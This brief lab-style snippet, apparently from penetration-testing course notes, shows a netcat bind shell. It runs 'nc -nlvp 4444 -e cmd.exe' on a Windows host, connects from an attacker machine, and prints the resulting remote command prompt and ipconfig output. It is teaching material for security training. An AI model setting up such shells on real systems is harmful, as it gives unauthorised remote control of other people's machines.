# 1) spawn listener and bind cmd.exe
```bat
nc -nlvp 4444 -e cmd.exe
```

# 2) Connection from attacker machine
```sh
nc -nv 10.11.0.22 4444
...
(UNKNOWN) [10.11.0.22] 4444 (?) open

Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec> ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
    Connection-specific DNS Suffix . :
    IPv4 Address. . . . . . . . . . . : 10.11.0.22
    Subnet Mask . . . . . . . . . . . : 255.255.0.0
    Default Gateway . . . . . . . . . : 10.11.0.1
```
